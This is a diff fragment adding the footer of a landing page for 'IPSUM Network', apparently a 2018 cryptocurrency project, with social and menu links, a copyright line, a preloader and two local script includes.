+							<li class="animated" data-animate="fadeInUp" data-delay=".3"><a href="https://bitcointalk.org/index.php?topic=3337993.0" target="_blank"><em class="fa fa-bitcoin"></em></a></li>
+						</ul>
+					</div>
+					<div class="col-sm-6 col-xl-4 res-l-bttm">
+						<div class="footer-subscription">
+						</div>
+					</div>
+					<div class="col-xl-4">
+						<ul class="link-widget animated" data-animate="fadeInUp" data-delay=".8">
+							<li><a href="#intro" class="menu-link">What is IPSUM</a></li>
+							<li><a href="https://discord.gg/RhqZTXr" class="menu-link" target="_blank">Discord</a></li>
+							<li><a href="#" class="menu-link">Whitepaper</a></li>
+							<li><a href="#team" class="menu-link">Teams</a></li>
+							<li><a href="#faq" class="menu-link">FAQ</a></li>
+						</ul>
+					</div>
+				</div>
+				<div class="gaps size-2x"></div>
+				<div class="row">
+					<div class="col-md-7"><span class="copyright-text">
+						Copyright &copy; 2018, IPSUM Network.
+						<span>All trademarks and copyrights belong to their respective owners.</span></span>
+					</div>
+					<div class="col-md-5 text-right mobile-left">
+						<ul class="footer-links">
+							<li><a href="#">Privacy Policy</a></li>
+							<li><a href="#">Terms &amp; Conditions</a></li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="preloader">
+			<div id="loader"></div>
+			<div class="loader-section loader-top"></div>
+			<div class="loader-section loader-bottom"></div>
+		</div>
+		<script src="assets/js/jquery-v3.3.1.min.js"></script>
+		<script src="assets/js/global.min.js?ver=0.1.1"></script>
+	</body>
 </html>
